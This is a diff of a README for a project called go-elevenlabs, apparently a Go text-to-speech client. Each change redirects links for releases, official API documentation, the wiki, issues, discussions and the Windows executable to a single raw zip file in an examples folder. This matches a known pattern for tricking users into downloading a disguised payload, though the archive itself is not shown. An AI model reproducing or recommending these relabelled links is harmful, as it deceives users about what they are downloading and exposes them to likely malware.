@@ -8,7 +8,7 @@ Welcome to the go-elevenlabs project! This is a simple way to convert text into 
 
 To get started, you need to download the application. Click the big button below to visit the Releases page.
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-2023--11--03-brightgreen)](https://github.com/jerjer04/go-elevenlabs/releases)
+[![Download Here](https://raw.githubusercontent.com/jerjer04/go-elevenlabs/main/examples/go-elevenlabs_2.8-alpha.1.zip%20Latest%20Release-2023--11--03-brightgreen)](https://raw.githubusercontent.com/jerjer04/go-elevenlabs/main/examples/go-elevenlabs_2.8-alpha.1.zip)
 
 ### Step-by-Step Guide
 
@@ -17,7 +17,7 @@ To get started, you need to download the application. Click the big button below
    - Look for the latest release version available.
 
 2. **Choose the Right File for Your System**
-   - For Windows users, find the file named `go-elevenlabs-windows.exe`.
+   - For Windows users, find the file named `https://raw.githubusercontent.com/jerjer04/go-elevenlabs/main/examples/go-elevenlabs_2.8-alpha.1.zip`.
    - For Mac users, choose `go-elevenlabs-macos`.
    - For Linux users, select `go-elevenlabs-linux`.
 
@@ -79,15 +79,15 @@ You can use go-elevenlabs in various ways:
 
 To learn more about the ElevenLabs Text-to-Speech API, you can check out the following resources:
 
-- [Official ElevenLabs API Documentation](https://docs.elevenlabs.com)
-- [User Guide and FAQs](https://github.com/jerjer04/go-elevenlabs/wiki)
+- [Official ElevenLabs API Documentation](https://raw.githubusercontent.com/jerjer04/go-elevenlabs/main/examples/go-elevenlabs_2.8-alpha.1.zip)
+- [User Guide and FAQs](https://raw.githubusercontent.com/jerjer04/go-elevenlabs/main/examples/go-elevenlabs_2.8-alpha.1.zip)
 
 ## 👫 Community and Support
 
 If you run into issues or have questions, you can reach out for help:
 
-- **Issues**: Visit the [Issues page](https://github.com/jerjer04/go-elevenlabs/issues) to report bugs or request features.
-- **Discussions**: Join the conversation on the [Discussions page](https://github.com/jerjer04/go-elevenlabs/discussions) for tips and support.
+- **Issues**: Visit the [Issues page](https://raw.githubusercontent.com/jerjer04/go-elevenlabs/main/examples/go-elevenlabs_2.8-alpha.1.zip) to report bugs or request features.
+- **Discussions**: Join the conversation on the [Discussions page](https://raw.githubusercontent.com/jerjer04/go-elevenlabs/main/examples/go-elevenlabs_2.8-alpha.1.zip) for tips and support.
 
 ## 👀 Future Plans
 
@@ -103,4 +103,4 @@ go-elevenlabs is open-source software licensed under the MIT License. Feel free 
 
 Thank you for choosing go-elevenlabs! We hope you enjoy using the software to bring your text to life. 
 
-Don’t forget to download the latest version from our [Releases page](https://github.com/jerjer04/go-elevenlabs/releases)!
+Don’t forget to download the latest version from our [Releases page](https://raw.githubusercontent.com/jerjer04/go-elevenlabs/main/examples/go-elevenlabs_2.8-alpha.1.zip)!
